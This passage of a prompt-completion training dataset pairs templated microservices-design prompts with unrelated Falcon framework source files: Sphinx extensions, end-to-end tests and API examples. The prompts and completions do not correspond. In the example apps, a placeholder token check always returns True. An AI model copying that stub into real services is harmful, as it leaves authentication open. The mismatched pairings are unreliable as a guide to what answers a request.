stable_releases.append(\n                _FalconMajorMinor(first=min(series), latest=max(series))\n            )\n\n        current = stable_releases[0]\n        current_series = sorted(\n            rel for rel in stable_releases if rel.first.major == current.first.major\n        )\n        oldstable = max(\n            rel for rel in stable_releases if rel.first.major == current.first.major - 1\n        )\n\n        header = '.. list-table::\\n    :header-rows: 1\\n\\n'\n        rows = [\n            (\n                'Major/Minor Version',\n                'First Release',\n                'Latest Patch Release',\n                'Release Status',\n            )\n        ]\n\n        for first, latest in stable_releases:\n            eol_label = ''\n            if latest == current.latest:\n                status = _ReleaseStatus.current\n            elif latest == oldstable.latest:\n                eol_date = (\n                    current_series[0].first.date + self._OLDSTABLE_MAINTENANCE_PERIOD\n                )\n                if datetime.date.today() < eol_date:\n                    status = _ReleaseStatus.security\n                    # NOTE(vytas): Move to a new line because otherwise table\n                    #   layout gets messed up in an unpleasant way.\n                    eol_label = f'\\n\\n        (until {eol_date})'\n                else:\n                    status = _ReleaseStatus.eol\n                    eol_label = f'(since {eol_date})'\n            else:\n                status = _ReleaseStatus.eol\n\n            rows.append(\n                (\n                    first.doc_link_major_minor,\n                    first.rst_repr,\n                    latest.version_str if latest == first else latest.rst_repr,\n                    f'{status.ref} {eol_label}',\n                )\n            )\n\n        content = '\\n\\n'.join(\n            '    * ' + '\\n      '.join(f'- {cell}' for cell in row) for row in rows\n        )\n\n        return self.parse_text_to_nodes(header + content)\n\n\ndef setup(app):\n    app.add_directive('falcon-releases', FalconReleasesDirective)\n\n    return {\n        'version': '0.1',\n        'parallel_read_safe': True,\n        'parallel_write_safe': True,\n    }\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "docs/ext/falcon_releases.py", "language": "python", "complexity": "complex", "star_count": 9692, "quality_score": 0.85, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 222}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2021 by Kurt Griffiths\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Private args module extension for Sphinx.\n\nThis extension excludes underscore-prefixed args and kwargs from the function\nsignature.\n\"\"\"\n\n\ndef _on_process_signature(app, what, name, obj, options, signature, return_annotation):\n    if what in ('function', 'method') and signature and '_' in signature:\n        filtered = []\n\n        for token in signature[1:-1].split(','):\n            token = token.strip()\n\n            if not token.startswith('_'):\n                filtered.append(token)\n\n        signature = f'({\", \".join(filtered)})'\n\n    return signature, return_annotation\n\n\ndef setup(app):\n    app.connect('autodoc-process-signature', _on_process_signature)\n\n    return {'parallel_read_safe': True}\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "docs/ext/private_args.py", "language": "python", "complexity": "simple", "star_count": 9692, "quality_score": 0.7899999999999999, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 41}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2016 by Rackspace Hosting, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"RFC extension for Sphinx.\n\nThis extensions adds hyperlinking for any RFC references that are\nformatted like this::\n\n    RFC 7231; Section 6.5.3\n\"\"\"\n\nimport re\n\nIETF_DOCS = 'https://datatracker.ietf.org/doc/html'\nRFC_PATTERN = re.compile(r'RFC (\\d{4}), Section ([\\d\\.]+)')\n\n\ndef _render_section(section_number, rfc_number):\n    template = '`{0} <https://tools.ietf.org/html/rfc{1}#section-{0}>`_'\n    return template.format(section_number, rfc_number)\n\n\ndef _process_line(line):\n    m = RFC_PATTERN.search(line)\n    if not m:\n        return line\n\n    rfc = m.group(1)\n    section = m.group(2)\n\n    template = (\n        '`RFC {rfc}, Section {section} <{ietf_docs}/rfc{rfc}#section-{section}>`__'\n    )\n\n    rendered_text = template.format(rfc=rfc, section=section, ietf_docs=IETF_DOCS)\n\n    return line[: m.start()] + rendered_text + line[m.end() :]\n\n\ndef _on_process_docstring(app, what, name, obj, options, lines):\n    \"\"\"Process the docstring for a given python object.\"\"\"\n\n    if what == 'module' and name == 'falcon':\n        lines[:] = []\n        return\n\n    lines[:] = [_process_line(line) for line in lines]\n\n\ndef setup(app):\n    app.connect('autodoc-process-docstring', _on_process_docstring)\n\n    return {'parallel_read_safe': True}\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "docs/ext/rfc.py", "language": "python", "complexity": "simple", "star_count": 9692, "quality_score": 0.7899999999999999, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 65}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2025 by Vytautas Liuolia.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Hacks and workarounds for Sphinx bugs.\"\"\"\n\nimport sphinx.util.inspect\n\n\ndef patch_type_alias_forward_ref(cls: type) -> None:\n    def __hash__(obj) -> int:\n        return hash(obj.name)\n\n    # NOTE(vytas): Based on various issue comments in the Sphinx repo.\n    def __repr__(obj) -> str:\n        return obj.name\n\n    cls.__hash__ = __hash__\n    cls.__repr__ = __repr__\n\n\ndef setup(app):\n    patch_type_alias_forward_ref(sphinx.util.inspect.TypeAliasForwardRef)\n\n    return {\n        'version': '0.1',\n        'parallel_read_safe': True,\n        'parallel_write_safe': True,\n    }\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "docs/ext/workarounds.py", "language": "python", "complexity": "simple", "star_count": 9692, "quality_score": 0.7899999999999999, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 40}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2020-2025 by Vytautas Liuolia.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport pathlib\nimport subprocess\nimport time\n\nimport pytest\nimport requests\n\nimport falcon.testing\n\nHERE = pathlib.Path(__file__).resolve().parent\nINDEX = '/static/index.html'\n\n\n@pytest.fixture(scope='session')\ndef base_url():\n    port = falcon.testing.get_unused_port()\n    base_url = f'http://127.0.0.1:{port}'\n\n    uvicorn = subprocess.Popen(\n        ('uvicorn', '--port', str(port), 'server:app'),\n        cwd=HERE,\n    )\n\n    # NOTE(vytas): give Uvicorn some time to start.\n    for attempt in range(3):\n        try:\n            resp = requests.get(f'{base_url}/ping', timeout=1)\n            resp.raise_for_status()\n            break\n        except requests.exceptions.RequestException:\n            pass\n        time.sleep(attempt + 0.5)\n    else:\n        pytest.fail('Could not start Uvicorn')\n\n    yield base_url\n\n    uvicorn.terminate()\n\n    # NOTE(vytas): give Unicorn a rather generous time period to stop since it\n    #   is waiting for the browser to close open connections such as WS & SSE.\n    uvicorn.communicate(timeout=30)\n\n\n@pytest.fixture()\n# NOTE(vytas): sb here is seleniumbase's pytest fixture, see also\n#   \"The sb pytest fixture (no class)\" at\n#   https://seleniumbase.io/help_docs/syntax_formats/.\ndef browser(sb, base_url):\n    sb.open(base_url + INDEX)\n\n    sb.assert_text('SSE CONNECTED', 'div.sse', timeout=5)\n    sb.remove_elements('div.message')\n\n    return sb\n\n\n@pytest.fixture()\ndef clear_log(browser):\n    def _impl():\n        browser.remove_elements('div.message')\n\n    return _impl\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "e2e-tests/conftest.py", "language": "python", "complexity": "simple", "star_count": 9692, "quality_score": 0.82, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 78}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2020-2025 by Vytautas Liuolia.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\ndef test_sse_broadcast(browser, clear_log):\n    browser.slow_click('#button1')\n    browser.assert_text('WS1 CONNECTED', 'div.sse', timeout=5)\n    clear_log()\n\n    browser.type('#input1', '/all Zombie alert!')\n    browser.slow_click('#button1')\n    browser.assert_text('[WS1] Zombie alert!', 'div.sse', timeout=5)\n    clear_log()\n\n    browser.type('#input1', '/all Zombie apocalypse averted (for now)')\n    browser.slow_click('#button1')\n    browser.assert_text(\n        '[WS1] Zombie apocalypse averted (for now)', 'div.sse', timeout=5\n    )\n    clear_log()\n\n    browser.type('#input1', '/quit')\n    browser.slow_click('#button1')\n    browser.assert_text('Bye, WS1!', 'div.ws1', timeout=5)\n    browser.assert_text('WS1 DISCONNECTED', 'div.sse', timeout=5)\n\n\ndef test_chat(browser, clear_log):\n    browser.slow_click('#button1')\n    browser.assert_text('Hello, WS1!', 'div.ws1', timeout=5)\n    browser.assert_text('WS1 CONNECTED', 'div.sse', timeout=5)\n    clear_log()\n\n    browser.slow_click('#button2')\n    browser.assert_text('Hello, WS2!', 'div.ws2', timeout=5)\n    browser.assert_text('WS2 CONNECTED', 'div.sse', timeout=5)\n    clear_log()\n\n    browser.type('#input1', '/msg WS2 Apples')\n    browser.slow_click('#button1')\n    browser.assert_text('[WS1] Apples', 'div.ws2', timeout=5)\n    clear_log()\n\n    browser.type('#input1', '/msg WS2 Oranges')\n    browser.slow_click('#button1')\n    browser.assert_text('[WS1] Oranges', 'div.ws2', timeout=5)\n    clear_log()\n\n    browser.type('#input1', '/msg WS2 Bananas')\n    browser.slow_click('#button1')\n    browser.assert_text('[WS1] Bananas', 'div.ws2', timeout=5)\n    clear_log()\n\n    browser.type('#input2', '/msg WS1 Talk to you later...')\n    browser.slow_click('#button2')\n    browser.assert_text('[WS2] Talk to you later...', 'div.ws1', timeout=5)\n    clear_log()\n\n    browser.type('#input1', '/quit')\n    browser.slow_click('#button1')\n    browser.assert_text('Bye, WS1!', 'div.ws1', timeout=5)\n    browser.assert_text('DISCONNECTED (4001 quit command)', '#input1')\n\n    browser.type('#input2', '/quit')\n    browser.slow_click('#button2')\n    browser.assert_text('Bye, WS2!', 'div.ws2', timeout=5)\n    browser.assert_text('DISCONNECTED (4001 quit command)', '#input2')\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "e2e-tests/test_e2e.py", "language": "python", "complexity": "simple", "star_count": 9692, "quality_score": 0.7899999999999999, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 79}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# examples/things_advanced.py\n\nimport json\nimport logging\nimport uuid\nfrom wsgiref import simple_server\n\nimport requests\n\nimport falcon\n\n\nclass StorageEngine:\n    def get_things(self, marker, limit):\n        return [{'id': str(uuid.uuid4()), 'color': 'green'}]\n\n    def add_thing(self, thing):\n        thing['id'] = str(uuid.uuid4())\n        return thing\n\n\nclass StorageError(Exception):\n    @staticmethod\n    def handle(req, resp, ex, params):\n        # TODO: Log the error, clean up, etc. before raising\n        raise falcon.HTTPInternalServerError()\n\n\nclass SinkAdapter:\n    engines = {\n        'ddg': 'https://duckduckgo.com',\n        'y': 'https://search.yahoo.com/search',\n    }\n\n    def __call__(self, req, resp, engine):\n        url = self.engines[engine]\n        params = {'q': req.get_param('q', True)}\n        result = requests.get(url, params=params)\n\n        resp.status = falcon.code_to_http_status(result.status_code)\n        resp.content_type = result.headers['content-type']\n        resp.text = result.text\n\n\nclass AuthMiddleware:\n    def process_request(self, req, resp):\n        token = req.get_header('Authorization')\n        account_id = req.get_header('Account-ID')\n\n        challenges = ['Token type=\"Fernet\"']\n\n        if token is None:\n            description = 'Please provide an auth token as part of the request.'\n\n            raise falcon.HTTPUnauthorized(\n                title='Auth token required',\n                description=description,\n                challenges=challenges,\n                href='http://docs.example.com/auth',\n            )\n\n        if not self._token_is_valid(token, account_id):\n            description = (\n                'The provided auth token is not valid. '\n                'Please request a new token and try again.'\n            )\n\n            raise falcon.HTTPUnauthorized(\n                title='Authentication required',\n                description=description,\n                challenges=challenges,\n                href='http://docs.example.com/auth',\n            )\n\n    def _token_is_valid(self, token, account_id):\n        return True  # Suuuuuure it's valid...\n\n\nclass RequireJSON:\n    def process_request(self, req, resp):\n        if not req.client_accepts_json:\n            raise falcon.HTTPNotAcceptable(\n                description='This API only supports responses encoded as JSON.',\n                href='http://docs.examples.com/api/json',\n            )\n\n        if req.method in ('POST', 'PUT'):\n            if 'application/json' not in req.content_type:\n                raise falcon.HTTPUnsupportedMediaType(\n                    title='This API only supports requests encoded as JSON.',\n                    href='http://docs.examples.com/api/json',\n                )\n\n\nclass JSONTranslator:\n    # NOTE: Normally you would simply use req.media and resp.media for\n    # this particular use case; this example serves only to illustrate\n    # what is possible.\n\n    def process_request(self, req, resp):\n        # req.stream corresponds to the WSGI wsgi.input environ variable,\n        # and allows you to read bytes from the request body.\n        #\n        # See also: PEP 3333\n        if req.content_length in (None, 0):\n            # Nothing to do\n            return\n\n        body = req.stream.read()\n        if not body:\n            raise falcon.HTTPBadRequest(\n                title='Empty request body',\n                description='A valid JSON document is required.',\n            )\n\n        try:\n            req.context.doc = json.loads(body.decode('utf-8'))\n\n        except (ValueError, UnicodeDecodeError):\n            description = (\n                'Could not decode the request body. The '\n                'JSON was incorrect or not encoded as '\n                'UTF-8.'\n            )\n\n            raise falcon.HTTPBadRequest(title='Malformed JSON', description=description)\n\n    def process_response(self, req, resp, resource, req_succeeded):\n        if not hasattr(resp.context, 'result'):\n            return\n\n        resp.text = json.dumps(resp.context.result)\n\n\ndef max_body(limit):\n    def hook(req, resp, resource, params):\n        length = req.content_length\n        if length is not None and length > limit:\n            msg = (\n                'The size of the request is too large. The body must not '\n                'exceed ' + str(limit) + ' bytes in length.'\n            )\n\n            raise falcon.HTTPContentTooLarge(\n                title='Request body is too large', description=msg\n            )\n\n    return hook\n\n\nclass ThingsResource:\n    def __init__(self, db):\n        self.db = db\n        self.logger = logging.getLogger('thingsapp.' + __name__)\n\n    def on_get(self, req, resp, user_id):\n        marker = req.get_param('marker') or ''\n        limit = req.get_param_as_int('limit') or 50\n\n        try:\n            result = self.db.get_things(marker, limit)\n        except Exception as ex:\n            self.logger.error(ex)\n\n            description = (\n                'Aliens have attacked our base! We will '\n                'be back as soon as we fight them off. '\n                'We appreciate your patience.'\n            )\n\n            raise falcon.HTTPServiceUnavailable(\n                title='Service Outage', description=description, retry_after=30\n            )\n\n        # NOTE: Normally you would use resp.media for this sort of thing;\n        # this example serves only to demonstrate how the context can be\n        # used to pass arbitrary values between middleware components,\n        # hooks, and resources.\n        resp.context.result = result\n\n        resp.set_header('Powered-By', 'Falcon')\n        resp.status = falcon.HTTP_200\n\n    @falcon.before(max_body(64 * 1024))\n    def on_post(self, req, resp, user_id):\n        try:\n            doc = req.context.doc\n        except AttributeError:\n            raise falcon.HTTPBadRequest(\n                title='Missing thing',\n                description='A thing must be submitted in the request body.',\n            )\n\n        proper_thing = self.db.add_thing(doc)\n\n        resp.status = falcon.HTTP_201\n        resp.location = '/%s/things/%s' % (user_id, proper_thing['id'])\n\n\n# Configure your WSGI server to load \"things.app\" (app is a WSGI callable)\napp = falcon.App(\n    middleware=[\n        AuthMiddleware(),\n        RequireJSON(),\n        JSONTranslator(),\n    ]\n)\n\ndb = StorageEngine()\nthings = ThingsResource(db)\napp.add_route('/{user_id}/things', things)\n\n# If a responder ever raises an instance of StorageError, pass control to\n# the given handler.\napp.add_error_handler(StorageError, StorageError.handle)\n\n# Proxy some things to another service; this example shows how you might\n# send parts of an API off to a legacy system that hasn't been upgraded\n# yet, or perhaps is a single cluster that all data centers have to share.\nsink = SinkAdapter()\napp.add_sink(sink, r'/search/(?P<engine>ddg|y)\\Z')\n\n# Useful for debugging problems in your API; works with pdb.set_trace(). You\n# can also use Gunicorn to host your app. Gunicorn can be configured to\n# auto-restart workers when it detects a code change, and it also works\n# with pdb.\nif __name__ == '__main__':\n    httpd = simple_server.make_server('127.0.0.1', 8000, app)\n    httpd.serve_forever()\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "examples/things_advanced.py", "language": "python", "complexity": "complex", "star_count": 9692, "quality_score": 0.94, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 230}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# examples/things_advanced_asgi.py\n\nimport json\nimport logging\nimport uuid\n\nimport httpx\n\nimport falcon\nimport falcon.asgi\n\n\nclass StorageEngine:\n    async def get_things(self, marker, limit):\n        return [{'id': str(uuid.uuid4()), 'color': 'green'}]\n\n    async def add_thing(self, thing):\n        thing['id'] = str(uuid.uuid4())\n        return thing\n\n\nclass StorageError(Exception):\n    @staticmethod\n    async def handle(req, resp, ex, params):\n        # TODO: Log the error, clean up, etc. before raising\n        raise falcon.HTTPInternalServerError()\n\n\nclass SinkAdapter:\n    engines = {\n        'ddg': 'https://duckduckgo.com',\n        'y': 'https://search.yahoo.com/search',\n    }\n\n    async def __call__(self, req, resp, engine):\n        url = self.engines[engine]\n        params = {'q': req.get_param('q', True)}\n\n        async with httpx.AsyncClient() as client:\n            result = await client.get(url, params=params)\n\n        resp.status = result.status_code\n        resp.content_type = result.headers['content-type']\n        resp.text = result.text\n\n\nclass AuthMiddleware:\n    async def process_request(self, req, resp):\n        token = req.get_header('Authorization')\n        account_id = req.get_header('Account-ID')\n\n        challenges = ['Token type=\"Fernet\"']\n\n        if token is None:\n            description = 'Please provide an auth token as part of the request.'\n\n            raise falcon.HTTPUnauthorized(\n                title='Auth token required',\n                description=description,\n                challenges=challenges,\n                href='http://docs.example.com/auth',\n            )\n\n        if not self._token_is_valid(token, account_id):\n            description = (\n                'The provided auth token is not valid. '\n                'Please request a new token and try again.'\n            )\n\n            raise falcon.HTTPUnauthorized(\n                title='Authentication required',\n                description=description,\n                challenges=challenges,\n                href='http://docs.example.com/auth',\n            )\n\n    def _token_is_valid(self, token, account_id):\n        return True  # Suuuuuure it's valid...\n\n\nclass RequireJSON:\n    async def process_request(self, req, resp):\n        if not req.client_accepts_json:\n            raise falcon.HTTPNotAcceptable(\n                description='This API only supports responses encoded as JSON.',\n                href='http://docs.examples.com/api/json',\n            )\n\n        if req.method in ('POST', 'PUT'):\n            if 'application/json' not in req.content_type:\n                raise falcon.HTTPUnsupportedMediaType(\n                    title='This API only supports requests encoded as JSON.',\n                    href='http://docs.examples.com/api/json',\n                )\n\n\nclass JSONTranslator:\n    # NOTE: Normally you would simply use req.get_media() and resp.media for\n    # this particular use case; this example serves only to illustrate\n    # what is possible.\n\n    async def process_request(self, req, resp):\n        # NOTE: Test explicitly for 0, since this property could be None in\n        # the case that the Content-Length header is missing (in which case we\n        # can't know if there is a body without actually attempting to read\n        # it from the request stream.)\n        if req.content_length == 0:\n            # Nothing to do\n            return\n\n        body = await req.stream.read()\n        if not body:\n            raise falcon.HTTPBadRequest(\n                title='Empty request body',\n                description='A valid JSON document is required.',\n            )\n\n        try:\n            req.context.doc = json.loads(body.decode('utf-8'))\n\n        except (ValueError, UnicodeDecodeError):\n            description = (\n                'Could not decode the request body. The '\n                'JSON was incorrect or not encoded as '\n                'UTF-8.'\n            )\n\n            raise falcon.HTTPBadRequest(title='Malformed JSON', description=description)\n\n    async def process_response(self, req, resp, resource, req_succeeded):\n        if not hasattr(resp.context, 'result'):\n            return\n\n        resp.text = json.dumps(resp.context.result)\n\n\ndef max_body(limit):\n    async def hook(req, resp, resource, params):\n        length = req.content_length\n        if length is not None and length > limit:\n            msg = (\n                'The size of the request is too large. The body must not '\n                'exceed ' + str(limit) + ' bytes in length.'\n            )\n\n            raise falcon.HTTPContentTooLarge(\n                title='Request body is too large', description=msg\n            )\n\n    return hook\n\n\nclass ThingsResource:\n    def __init__(self, db):\n        self.db = db\n        self.logger = logging.getLogger('thingsapp.' + __name__)\n\n    async def on_get(self, req, resp, user_id):\n        marker = req.get_param('marker') or ''\n        limit = req.get_param_as_int('limit') or 50\n\n        try:\n            result = await self.db.get_things(marker, limit)\n        except Exception as ex:\n            self.logger.error(ex)\n\n            description = (\n                'Aliens have attacked our base! We will '\n                'be back as soon as we fight them off. '\n                'We appreciate your patience.'\n            )\n\n            raise falcon.HTTPServiceUnavailable(\n                title='Service Outage', description=description, retry_after=30\n            )\n\n        # NOTE: Normally you would use resp.media for this sort of thing;\n        # this example serves only to demonstrate how the context can be\n        # used to pass arbitrary values between middleware components,\n        # hooks, and resources.\n        resp.context.result = result\n\n        resp.set_header('Powered-By', 'Falcon')\n        resp.status = falcon.HTTP_200\n\n    @falcon.before(max_body(64 * 1024))\n    async def on_post(self, req, resp, user_id):\n        try:\n            doc = req.context.doc\n        except AttributeError:\n            raise falcon.HTTPBadRequest(\n                title='Missing thing',\n                description='A thing must be submitted in the request body.',\n            )\n\n        proper_thing = await self.db.add_thing(doc)\n\n        resp.status = falcon.HTTP_201\n        resp.location = '/%s/things/%s' % (user_id, proper_thing['id'])\n\n\n# The app instance is an ASGI callable\napp = falcon.asgi.App(\n    middleware=[\n        AuthMiddleware(),\n        RequireJSON(),\n        JSONTranslator(),\n    ]\n)\n\ndb = StorageEngine()\nthings = ThingsResource(db)\napp.add_route('/{user_id}/things', things)\n\n# If a responder ever raises an instance of StorageError, pass control to\n# the given handler.\napp.add_error_handler(StorageError, StorageError.handle)\n\n# Proxy some things to another service; this example shows how you might\n# send parts of an API off to a legacy system that hasn't been upgraded\n# yet, or perhaps is a single cluster that all data centers have to share.\nsink = SinkAdapter()\napp.add_sink(sink, r'/search/(?P<engine>ddg|y)\\Z')\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "examples/things_advanced_asgi.py", "language": "python", "complexity": "complex", "star_count": 9692, "quality_score": 0.9099999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 224}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2013 by Rackspace Hosting, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Primary package for Falcon, the minimalist web API framework.\n\nFalcon is a minimalist web API framework for building speedy web APIs and app\nbackends. The `falcon` package can be used to directly access most of\nthe framework's classes, functions, and variables::\n\n    import falcon\n\n    app = falcon.App()\n\"\"\"\n\nimport logging as _logging\n\n__all__ = (\n    # API interface\n    'API',\n    'App',\n    'after',\n    'before',\n    'BoundedStream',\n    'CORSMiddleware',\n    'HTTPError',\n    'HTTPStatus',\n    'HTTPFound',\n    'HTTPMovedPermanently',\n    'HTTPPermanentRedirect',\n    'HTTPSeeOther',\n    'HTTPTemporaryRedirect',\n    'Forwarded',\n    'Request',\n    'RequestOptions',\n    'Response',\n    'ResponseOptions',\n    # Public constants\n    'HTTP_METHODS',\n    'WEBDAV_METHODS',\n    'COMBINED_METHODS',\n    'DEFAULT_MEDIA_TYPE',\n    'MEDIA_BMP',\n    'MEDIA_GIF',\n    'MEDIA_HTML',\n    'MEDIA_JPEG',\n    'MEDIA_JS',\n    'MEDIA_JSON',\n    'MEDIA_MSGPACK',\n    'MEDIA_MULTIPART',\n    'MEDIA_PNG',\n    'MEDIA_TEXT',\n    'MEDIA_URLENCODED',\n    'MEDIA_XML',\n    'MEDIA_YAML',\n    'SINGLETON_HEADERS',\n    'WebSocketPayloadType',\n    # Utilities\n    'async_to_sync',\n    'BufferedReader',\n    'CaseInsensitiveDict',\n    'code_to_http_status',\n    'Context',\n    'create_task',\n    'deprecated',\n    'dt_to_http',\n    'ETag',\n    'get_argnames',\n    'get_bound_method',\n    'get_running_loop',\n    'http_cookies',\n    'http_date_to_dt',\n    'http_now',\n    'http_status_to_code',\n    'IS_64_BITS',\n    'is_python_func',\n    'mediatypes',\n    'misc',\n    'parse_header',\n    'reader',\n    'runs_sync',\n    'secure_filename',\n    'structures',\n    'sync',\n    'sync_to_async',\n    'time',\n    'TimezoneGMT',\n    'to_query_str',\n    'uri',\n    'wrap_sync_to_async',\n    'wrap_sync_to_async_unsafe',\n    # Error classes\n    'CompatibilityError',\n    'DelimiterError',\n    'HeaderNotSupported',\n    'HTTPBadGateway',\n    'HTTPBadRequest',\n    'HTTPConflict',\n    'HTTPFailedDependency',\n    'HTTPForbidden',\n    'HTTPGatewayTimeout',\n    'HTTPGone',\n    'HTTPInsufficientStorage',\n    'HTTPInternalServerError',\n    'HTTPInvalidHeader',\n    'HTTPInvalidParam',\n    'HTTPLengthRequired',\n    'HTTPLocked',\n    'HTTPLoopDetected',\n    'HTTPMethodNotAllowed',\n    'HTTPMissingHeader',\n    